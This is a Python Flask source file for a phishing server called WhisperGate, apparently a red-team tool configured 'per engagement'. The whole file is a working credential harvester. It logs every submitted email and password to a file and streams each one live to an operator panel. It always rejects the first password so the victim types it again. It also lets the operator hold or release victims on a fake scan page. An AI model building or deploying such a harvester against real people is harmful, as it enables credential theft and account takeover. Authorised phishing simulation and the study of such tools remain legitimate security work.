from datetime import datetime

def print_ascii_art():
    ascii_art = """

 __        ___     _                       ____       _       
 \\ \\      / / |__ (_)___ _ __   ___ _ __  / ___| __ _| |_ ___ 
  \\ \\ /\\ / /| '_ \\| / __| '_ \\ / _ \\ '__|| |  _ / _` | __/ _ \\
   \\ V  V / | | | | \\__ \\ |_) |  __/ |   | |_| | (_| | ||  __/
    \\_/\\_/  |_| |_|_|___/ .__/ \\___|_|    \\____|\\__,_|\\__\\___|
                        |_|                                    

    """
    author = "Written by: Justin Henderson - whisk3y3"
    github = "https://github.com/whisk3y3/WhisperGate"
    version = "Version 3.0"
    print(ascii_art)
    print(author)
    print(github)
    print(version)
    print()
    print("Happy Hunting!")
    print()

print_ascii_art()

from flask import Flask, render_template, request, jsonify, session
from flask_socketio import SocketIO, emit
import ssl
import os
import json
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*")

# ── Configuration ─────────────────────────────────
# Update these per engagement:
EMAIL_DOMAIN = '@evilphishinc.com'   # Target org email domain
MIN_PASS_LEN = 1                     # Minimum password length to accept
ADMIN_TOKEN = 'changeme'             # Token for operator panel access
REJECT_FIRST_ATTEMPT = True          # Reject first password, accept second
NEXT_DELAY = 30000                   # Default ms before Next button (operator can override)

# ── Session tracking ──────────────────────────────
active_sessions = {}

def log_credentials(email, password, ip, attempt_num, user_agent=''):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    entry = f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password} | Attempt: {attempt_num}"
    with open('credentials.txt', 'a') as f:
        f.write(entry + '\n')
    print(f"\n{'='*60}")
    print(f"  CREDENTIAL CAPTURED")
    print(f"  Time:     {timestamp}")
    print(f"  IP:       {ip}")
    print(f"  Email:    {email}")
    print(f"  Password: {password}")
    print(f"  Attempt:  {attempt_num}")
    print(f"{'='*60}\n")
    # Push to operator panel
    socketio.emit('credential', {
        'timestamp': timestamp,
        'ip': ip,
        'email': email,
        'password': password,
        'attempt': attempt_num,
        'user_agent': user_agent
    }, namespace='/operator')


# ── Routes ────────────────────────────────────────

@app.route('/')
def index():
    if 'sid' not in session:
        session['sid'] = secrets.token_hex(8)
        active_sessions[session['sid']] = {
            'attempts': 0,
            'email': None,
            'scan_complete': False
        }
    return render_template('index.html', next_delay=NEXT_DELAY)


@app.route('/check-email', methods=['POST'])
def check_email():
    """Email submitted — always 'found', transitions to password step."""
    data = request.get_json(silent=True) or {}
    email = data.get('email', '').strip()
    sid = session.get('sid', '')
    if sid in active_sessions:
        active_sessions[sid]['email'] = email
    return jsonify({'status': 'ok', 'org': 'Organization'})


@app.route('/login', methods=['POST'])
def login():
    """Password submitted — reject first attempt if configured."""
    data = request.get_json(silent=True) or {}
    if not data:
        email = request.form.get('email', '')
        password = request.form.get('password', '')
    else:
        email = data.get('email', '')
        password = data.get('password', '')

    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    sid = session.get('sid', '')

    if not email or len(password) < MIN_PASS_LEN:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 400

    if sid in active_sessions:
        active_sessions[sid]['attempts'] += 1
        attempt_num = active_sessions[sid]['attempts']
    else:
        attempt_num = 1

    # Always log
    log_credentials(email, password, ip, attempt_num, user_agent)

    # Reject first attempt
    if REJECT_FIRST_ATTEMPT and attempt_num == 1:
        return jsonify({
            'status': 'error',
            'message': 'Your account or password is incorrect. If you don\'t remember your password, reset it now.'
        }), 401

    return jsonify({'status': 'ok'})


@app.route('/scan-complete', methods=['POST'])
def scan_complete():
    """Prevents re-scan on refresh."""
    sid = session.get('sid', '')
    if sid in active_sessions:
        active_sessions[sid]['scan_complete'] = True
    return jsonify({'status': 'ok'})


@app.route('/session-state')
def session_state():
    """Returns state so page can resume after refresh."""
    sid = session.get('sid', '')
    state = active_sessions.get(sid, {})
    return jsonify({
        'scan_complete': state.get('scan_complete', False),
        'attempts': state.get('attempts', 0),
        'email': state.get('email', None)
    })


# ── Operator Panel ────────────────────────────────

@app.route('/operator')
def operator_panel():
    token = request.args.get('token', '')
    if token != ADMIN_TOKEN:
        return 'Unauthorized', 403
    return render_template('operator.html')


@socketio.on('connect', namespace='/operator')
def operator_connect():
    print('[Operator] Panel connected')


@socketio.on('extend_hold', namespace='/operator')
def extend_hold(data):
    extra_ms = data.get('ms', 15000)
    socketio.emit('extend_hold', {'ms': extra_ms}, namespace='/target')
    print(f'[Operator] Extended hold by {extra_ms}ms')


@socketio.on('trigger_next', namespace='/operator')
def trigger_next():
    """Operator can force the Next button to appear immediately."""
    socketio.emit('force_next', namespace='/target')
    print('[Operator] Forced Next button')


@socketio.on('connect', namespace='/target')
def target_connect():
    pass


# ── Main ──────────────────────────────────────────

if __name__ == '__main__':
    cert_file = 'fullchain.pem'
    key_file = 'privkey.pem'

    if os.path.exists(cert_file) and os.path.exists(key_file):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)
        socketio.run(app, host='0.0.0.0', port=443, ssl_context=context)
    else:
        print('[!] SSL certs not found — running on HTTP :5000 (dev mode)')
        socketio.run(app, host='0.0.0.0', port=5000, debug=True)
